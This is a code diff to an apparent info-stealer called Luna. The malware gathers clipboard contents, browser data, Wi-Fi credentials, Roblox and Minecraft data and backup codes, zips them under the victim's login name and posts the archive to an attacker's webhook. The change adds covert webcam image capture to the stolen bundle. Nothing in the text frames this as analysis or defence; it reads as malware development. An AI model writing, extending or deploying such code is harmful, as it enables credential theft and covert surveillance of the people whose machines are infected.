@@ -36,6 +36,8 @@ def main(webhook: str):
 		threads.append(Clipboard)
 	if __CONFIG__["killprotector"]:
 		threads.append(killprotector)
+	if __CONFIG__["webcam"]:
+		threads.append(capture_images)
 
 
 	with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
@@ -62,7 +64,7 @@ def main(webhook: str):
 			content = f"@{__CONFIG__['pingtype'].lower()}"
 			data.update({"content": content})
 
-	if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard"]):
+	if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard", "webcam"]):
 		with open(_file, 'rb') as file:
 			encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
 			requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
